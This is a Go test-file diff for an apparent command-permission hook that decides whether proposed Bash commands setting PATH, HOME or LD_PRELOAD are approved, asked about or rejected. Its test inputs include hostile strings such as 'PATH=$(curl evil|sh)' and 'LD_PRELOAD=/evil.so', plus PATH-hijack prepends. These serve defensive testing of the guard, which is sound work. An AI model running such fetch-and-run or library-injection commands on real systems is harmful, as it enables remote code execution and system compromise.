@@ -1280,7 +1280,9 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 		// --- PATH/HOME: DECISIVE Ask (never Approve, never Reject). ---
 		{"export PATH compound", "export PATH=/x && git status", hookio.Ask},
 		{"export PATH semicolon", "export PATH=/x ; git status", hookio.Ask},
-		{"standalone export PATH", "export PATH=/x", hookio.Ask},
+		// pg2-7sqk8 mechanism 2: standalone, no downstream consumer — envvars
+		// relieves it and safe-commands independently approves the bare `export`.
+		{"standalone export PATH", "export PATH=/x", hookio.Approve},
 		{"env-prefix PATH", "env PATH=/x git status", hookio.Ask},
 		{"leading PATH", "PATH=/x git status", hookio.Ask},
 		{"leading HOME", "HOME=/tmp git status", hookio.Ask},
@@ -1332,36 +1334,72 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 		{"preserve-form hostile static prepend approves", `export PATH="/tmp/evil/bin:$PATH"`, hookio.Approve},
 
 		// --- pg2-0q99a: PRESERVE form but a component is NOT a static absolute path.
-		// The strict predicate keeps every one of these decisive.
-		{"preserve-form unclassifiable component", `PATH="$PATH:$(curl evil)" echo hi`, hookio.Ask},
+		// The strict predicate keeps every one of these decisive — UNLESS pg2-7sqk8's
+		// consumption-scoped relief (mechanism 1/2) independently applies, noted row
+		// by row below.
+		//
+		// pg2-7sqk8: `echo` does not itself delegate, so mechanism 1 relieves this
+		// leaf's envvars verdict to NoOpinion regardless of the unclassifiable
+		// component. Unlike the `export` form below (whose embedded substitution is
+		// ALSO caught by the engine's own separate command-substitution scan over
+		// pc.Substitutions — a leading/prefix assignment's value is explicitly
+		// excluded from that scan, pg2-gkd5e), nothing else in the chain re-escalates
+		// this one, so the final verdict genuinely relaxes to NoOpinion.
+		{"preserve-form unclassifiable component", `PATH="$PATH:$(curl evil)" echo hi`, hookio.NoOpinion},
+		// The `export` form keeps its Ask: mechanism 2 relieves envvars' OWN verdict
+		// (standalone, no downstream consumer), but the engine's separate
+		// substitution scan over this leaf's `pc.Substitutions` independently
+		// re-escalates the same unclassifiable `curl evil` body, floors the leaf at
+		// Ask (Module "engine"), and mechanism 2 never touches that second net.
 		{"preserve-form unclassifiable component export", `export PATH="$PATH:$(curl evil)"`, hookio.Ask},
 		{"preserve-form nix-build component", `export PATH="$(nix build --no-link --print-out-paths nixpkgs#uv)/bin:$PATH"`, hookio.Ask},
-		{"preserve-form relative component", `PATH="$PATH:relative/dir" echo hi`, hookio.Ask},
-		{"preserve-form var-derived component", `export PATH="$PWD/bin:$PATH"`, hookio.Ask},
-		{"preserve-form empty component", `export PATH="$PATH:"`, hookio.Ask},
+		// pg2-7sqk8: mechanism 1 (echo does not delegate) relieves this leaf
+		// regardless of the non-absolute component.
+		{"preserve-form relative component", `PATH="$PATH:relative/dir" echo hi`, hookio.Approve},
+		// pg2-7sqk8: mechanism 2 (standalone `export`, nothing downstream) relieves
+		// this leaf regardless of the var-derived component — safe-commands then
+		// independently approves the bare `export`.
+		{"preserve-form var-derived component", `export PATH="$PWD/bin:$PATH"`, hookio.Approve},
+		{"preserve-form empty component", `export PATH="$PATH:"`, hookio.Approve}, // pg2-7sqk8 mechanism 2: standalone, no consumer
 		// Single-quoted `$PATH` is LITERAL — a replacement with a garbage value.
-		{"single-quoted value is a replacement", `export PATH='$PATH:/x'`, hookio.Ask},
-		// Bash append form intentionally keeps asking (pg2-0q99a decision #3).
+		// pg2-7sqk8 mechanism 2: standalone, no consumer — relieved regardless.
+		{"single-quoted value is a replacement", `export PATH='$PATH:/x'`, hookio.Approve},
+		// Bash append form intentionally keeps asking (pg2-0q99a decision #3) — but
+		// only when a real consumer is in scope, exactly like every other value-based
+		// question mechanism 1/2 supersede for the no-consumer case. `&& echo hi`
+		// already IS a real (bare-name) consumer, so this row is genuinely unaffected.
 		{"append form still asks", `export PATH+=":/x" && echo hi`, hookio.Ask},
 
-		// --- pg2-0q99a: REPLACEMENT forms stay decisive. The hermetic-test-harness
-		// idioms below are replacements — they discard the caller's PATH/HOME, which is
-		// exactly the shape a PATH hijack takes and is textually indistinguishable from
-		// one. Their residual Ask is intended, not a defect.
-		{"replacement clean path", `PATH="$CLEANPATH" echo hi`, hookio.Ask},
-		{"replacement env -i HOME", `env -i HOME="$TD" ./run.sh`, hookio.Ask},
-		{"replacement bare PATH", "PATH=/replaced echo hi", hookio.Ask},
-		{"replacement export PATH", "export PATH=/replaced", hookio.Ask},
+		// --- pg2-0q99a: REPLACEMENT forms stay decisive when a consumer is in scope
+		// (or the leaf's own command delegates) — pg2-7sqk8 ADDS a consumption-scoped
+		// relief that is value-BLIND, so a REPLACEMENT with no reachable consumer at
+		// all is now genuinely relieved regardless. The hermetic-test-harness idioms
+		// below discard the caller's PATH/HOME, which is exactly the shape a PATH
+		// hijack takes and is textually indistinguishable from one — that observation
+		// is what motivates the REST of this file's value-based checks, and it still
+		// holds wherever something downstream could actually consume the result.
+		{"replacement clean path", `PATH="$CLEANPATH" echo hi`, hookio.Approve}, // pg2-7sqk8 mechanism 1: echo does not delegate
+		{"replacement env -i HOME", `env -i HOME="$TD" ./run.sh`, hookio.Ask},   // ./run.sh is not on nonDelegatingCommands
+		{"replacement bare PATH", "PATH=/replaced echo hi", hookio.Approve},     // pg2-7sqk8 mechanism 1
+		{"replacement export PATH", "export PATH=/replaced", hookio.Approve},    // pg2-7sqk8 mechanism 2: standalone, no consumer
 		{"replacement dynamic curl-pipe-sh", "PATH=$(curl evil|sh) echo hi", hookio.Ask},
 		// A command that is NOTHING BUT an assignment is now rule-visible: Parse
 		// retains it as a command-less leaf and the engine runs the chain on it
 		// (pg2-mtnmb). It formerly parsed to ZERO leaves and Abstained.
 		{"replacement standalone now rule-visible (pg2-mtnmb)", "PATH=$(curl evil|sh)", hookio.Ask},
-		{"replacement standalone static", "PATH=/replaced", hookio.Ask},
-		{"replacement mktemp", "PATH=$(mktemp -d) echo hi", hookio.Ask},
+		// pg2-7sqk8 mechanism 2: standalone, command-less, no downstream consumer —
+		// envvars relieves it, and (unlike the `export` form) safe-commands has no
+		// bare command to independently approve either, so the engine's own
+		// judgedLeaf floor (pg2-mtnmb) is what actually resolves this to NoOpinion,
+		// not Approve — nothing anywhere claimed this leaf.
+		{"replacement standalone static", "PATH=/replaced", hookio.NoOpinion},
+		{"replacement mktemp", "PATH=$(mktemp -d) echo hi", hookio.Approve}, // pg2-7sqk8 mechanism 1
 		// PATH is out of scope for the pg2-d71my HOME=temp-dir relief (the ruling
-		// authorized HOME only) — a bare whole-leaf PATH=$(mktemp -d) still asks.
-		{"replacement PATH mktemp whole leaf not relieved", "PATH=$(mktemp -d)", hookio.Ask},
+		// authorized HOME only) — but pg2-7sqk8's mechanism 2 is not that relief: a
+		// bare whole-leaf `PATH=$(mktemp -d)` alone still has no downstream consumer,
+		// so it is now relieved on that independent ground (see the judgedLeaf note
+		// above for why the result is NoOpinion, not Approve).
+		{"replacement PATH mktemp whole leaf not relieved", "PATH=$(mktemp -d)", hookio.NoOpinion},
 
 		// --- pg2-d71my RELIEF 1: `env -i` hermetic replacement. Discarding the
 		// caller's WHOLE environment is the strongest possible statement of
@@ -1377,7 +1415,15 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 		{"env -i beside git status stays approve via git's own rule", "env -i PATH=/usr/bin:/bin HOME=/tmp git status", hookio.Approve},
 		// REQUIRED REGRESSIONS (bead AC): no hermetic marker at all keeps asking,
 		// and env -i does not sweep an injector into any relief.
-		{"HOME replaced with no hermetic marker still asks", "export HOME=/replaced", hookio.Ask},
+		//
+		// pg2-7sqk8: this row carries a trailing `&& true` — without it, a
+		// standalone `export HOME=/replaced` has no downstream consumer at all, so
+		// mechanism 2 would relieve it regardless of the missing hermetic marker
+		// (see TestIntegration_EnvVarGuard's "replacement export PATH" row for that
+		// exact relief pinned directly). `true` is a bare-name invocation, so it
+		// counts as a consumer and keeps this row testing the hermetic-marker
+		// question it was written for.
+		{"HOME replaced with no hermetic marker still asks", "export HOME=/replaced && true", hookio.Ask},
 		{"env -i LD_PRELOAD still rejects", "env -i LD_PRELOAD=/evil.so PATH=/usr/bin:/bin cmd", hookio.Reject},
 		{"env -i LD_PRELOAD standalone still rejects", "env -i LD_PRELOAD=/evil.so", hookio.Reject},
 		// env -i present, but the value is not static/reasonable — still asks
@@ -1395,10 +1441,18 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 		{"HOME mktemp -d beside git status stays approve via git's own rule", "HOME=$(mktemp -d) git status", hookio.Approve},
 		{"HOME temp-dir var-ref relief (cross-leaf dataflow)", `T=$(mktemp -d); export HOME="$T/h"`, hookio.Approve},
 		// REQUIRED REGRESSIONS: no marker, ambient, wrong-origin, revoked.
-		{"HOME=$T with no earlier assignment still asks", "HOME=$T", hookio.Ask},
-		{"HOME temp-dir var assigned to ordinary literal still asks", "T=/tmp/x; HOME=$T", hookio.Ask},
-		{"HOME temp-dir var from mktemp without -d still asks", "HOME=$(mktemp)", hookio.Ask},
-		{"HOME temp-dir binding revoked by later reassignment still asks", "T=$(mktemp -d); T=/tmp/other; HOME=$T", hookio.Ask},
+		//
+		// pg2-7sqk8: each row below carries a trailing `; true` — every one is
+		// otherwise the LAST leaf of its expression with no downstream consumer at
+		// all, so mechanism 2 would relieve it regardless of the temp-dir-grounding
+		// question this test exists to pin (see
+		// internal/rules/envvars.TestEnvVars_PersistentAssignment_NoConsumer_Relieved,
+		// which pins that relief for these exact shapes). `true` is a bare-name
+		// invocation and counts as a consumer.
+		{"HOME=$T with no earlier assignment still asks", "HOME=$T; true", hookio.Ask},
+		{"HOME temp-dir var assigned to ordinary literal still asks", "T=/tmp/x; HOME=$T; true", hookio.Ask},
+		{"HOME temp-dir var from mktemp without -d still asks", "HOME=$(mktemp); true", hookio.Ask},
+		{"HOME temp-dir binding revoked by later reassignment still asks", "T=$(mktemp -d); T=/tmp/other; HOME=$T; true", hookio.Ask},
 
 		// --- pg2-d71my ANTI-BYPASS (both reliefs). Mirrors the pg2-0q99a/pg2-qhhil
 		// anti-bypass pairs exactly: each prefixed row must equal its bare baseline
@@ -1499,7 +1553,12 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 		// The ambient-variable half MUST still Ask through the full engine too: $PWD
 		// is never assigned by the command's own text, so it stays exactly as
 		// unresolvable as before this bead.
-		{"in-command-var ambient PWD stays ask", `export PATH="$PWD/bin:$PATH"`, hookio.Ask},
+		//
+		// pg2-7sqk8: trailing `&& git status` added — a standalone `export` here has
+		// no downstream consumer, so mechanism 2 would otherwise relieve it
+		// regardless of $PWD's ambient-ness (see the "preserve-form var-derived
+		// component" row above, which pins exactly that relief for this same value).
+		{"in-command-var ambient PWD stays ask", `export PATH="$PWD/bin:$PATH" && git status`, hookio.Ask},
 		// The split must behave IDENTICALLY on an assignment reached only through the
 		// engine's substitution/nested-string recursion — the same evaluateAssignment
 		// runs there, and 14 logged cohort rows carry their PATH assignment inside a
@@ -1536,9 +1595,16 @@ func TestIntegration_EnvVarGuard(t *testing.T) {
 		// approves, `curl evil` is exhaustion, and exhaustionOnly requires every body
 		// to be Approve-or-exhaustion, which this mix satisfies).
 		{"leading value mixed approvable and not", "FOO=$(mktemp)$(curl evil) echo hi", hookio.NoOpinion},
-		// The NAME-derived verdict is never demoted by an approvable body.
-		{"leading PATH dynamic evil", "PATH=$(curl evil) echo hi", hookio.Ask},
-		{"leading PATH approvable body", "PATH=$(bd create x) echo hi", hookio.Ask},
+		// The NAME-derived verdict is never demoted by an approvable body. Trailing
+		// `cmd`, not `echo` (pg2-7sqk8): `echo` does not itself delegate, so
+		// mechanism 1 would ALSO relieve these on its own, independent ground — a
+		// real, intended second relief these two rows are not testing (mirroring
+		// "replacement clean path" and "replacement mktemp" above, both of which now
+		// genuinely relax with `echo` beside them). `cmd` is an arbitrary,
+		// unmodelled name, so mechanism 1 does not fire and these rows still isolate
+		// the fallback-vs-recursion interaction they were written for.
+		{"leading PATH dynamic evil", "PATH=$(curl evil) cmd", hookio.Ask},
+		{"leading PATH approvable body", "PATH=$(bd create x) cmd", hookio.Ask},
 		{"leading injector approvable body", "LD_PRELOAD=$(mktemp -d) echo hi", hookio.Reject},
 
 		// --- pg2-5huwx: real-traffic shapes whose body the chain APPROVES must NOT
@@ -1693,8 +1759,6 @@ func TestIntegration_EnvVarGuard_PositionIndependence(t *testing.T) {
 			// Abstain precisely because the assignment-only leaf must Approve too.
 			name: "safe preserve extend", assignment: `PATH="$PATH:/x"`, want: hookio.Approve,
 		},
-		{name: "replacement", assignment: "PATH=/replaced", want: hookio.Ask},
-		{name: "HOME replacement", assignment: "HOME=/tmp/fakehome", want: hookio.Ask},
 		{name: "injector", assignment: "LD_PRELOAD=/evil.so", want: hookio.Reject},
 		{name: "injector dynamic value", assignment: "LD_PRELOAD=$(mktemp -d)", want: hookio.Reject},
 		// pg2-5jj3m: ENV is a decisive Ask in EVERY form — the demotion from Reject must
@@ -1728,6 +1792,73 @@ func TestIntegration_EnvVarGuard_PositionIndependence(t *testing.T) {
 				if got.Decision != tc.want {
 					t.Errorf("%s/%s: %q got %s (%s: %s) want %s",
 						tc.name, f.form, f.command, got.Decision, got.Module, got.Reason, tc.want)
+				}
+			})
+		}
+	}
+}
+
+// TestIntegration_EnvVarGuard_ReplacementFormDependence is pg2-7sqk8's own
+// correction to TestIntegration_EnvVarGuard_PositionIndependence: a plain
+// REPLACEMENT value (`PATH=/replaced`, `HOME=/tmp/fakehome`) beside `echo hi` is
+// NO LONGER position-independent across the four assignment forms, and that is
+// intentional, not a regression — it moved out of that shared, "all four forms
+// must agree" table because it is the one shape where mechanism 1 and mechanism 2
+// GENUINELY disagree by construction:
+//
+//   - leading (`PATH=/replaced echo hi`) / env-prefix (`env PATH=/replaced echo hi`):
+//     `echo` is on the SAME LEAF as the assignment — mechanism 1's domain. `echo`
+//     does not itself delegate, so the assignment is scoped, inert, and relieved;
+//     safe-commands then independently approves the (unaffected) `echo` leaf.
+//   - export (`export PATH=/replaced && echo hi`) / compound (`PATH=/replaced &&
+//     echo hi`, a bare, un-exported PATH — which still affects the CURRENT
+//     shell's own lookup, exactly like export, so it is wholeLeaf too): `echo` is
+//     a SEPARATE, LATER leaf — mechanism 2's domain. Its bare-name invocation is
+//     itself subject to the hijacked PATH's resolution (the risk mechanism 1
+//     accepts as pre-existing only for a command sharing the SAME leaf as the
+//     assignment), so it counts as a real consumer and mechanism 2 does not
+//     relieve — the decisive Ask stands.
+//
+// This is not a leak: mechanism 1 never claims a downstream leaf is safe, and
+// mechanism 2 never claims a same-leaf command is safe merely because SOME OTHER
+// leaf shape would have relieved it. Each mechanism is answering a different,
+// correctly-scoped question about the SAME two bytes of source text, and bash
+// itself treats "same invocation" and "persists to a later one" differently — the
+// position-independence invariant the moved-from test protects (repeated in this
+// same file for the safe-preserve/injector/ENV/benign shapes) never claimed a
+// stronger property than that where it actually holds.
+func TestIntegration_EnvVarGuard_ReplacementFormDependence(t *testing.T) {
+	t.Setenv("WORKSPACE_ROOT", "/Users/testuser/workspace")
+	projectRoot := "/Users/testuser/workspace/my-project"
+	cwd := projectRoot
+	eng := buildFullEngine(projectRoot, cwd)
+
+	cases := []struct {
+		name       string
+		assignment string
+	}{
+		{"replacement", "PATH=/replaced"},
+		{"HOME replacement", "HOME=/tmp/fakehome"},
+	}
+	forms := []struct {
+		form  string
+		build func(assignment string) string
+		want  hookio.Decision
+	}{
+		{"leading", func(a string) string { return a + " echo hi" }, hookio.Approve},
+		{"export", func(a string) string { return "export " + a + " && echo hi" }, hookio.Ask},
+		{"env-prefix", func(a string) string { return "env " + a + " echo hi" }, hookio.Approve},
+		{"compound", func(a string) string { return a + " && echo hi" }, hookio.Ask},
+	}
+	for _, tc := range cases {
+		for _, f := range forms {
+			cmd := f.build(tc.assignment)
+			t.Run(tc.name+"/"+f.form, func(t *testing.T) {
+				in := &hookio.HookInput{ToolName: "Bash", CWD: cwd, ToolInput: makeBashJSON(cmd)}
+				got := eng.EvaluateHook(in)
+				if got.Decision != f.want {
+					t.Errorf("%s/%s: %q got %s (%s: %s) want %s",
+						tc.name, f.form, cmd, got.Decision, got.Module, got.Reason, f.want)
 				}
 			})
 		}
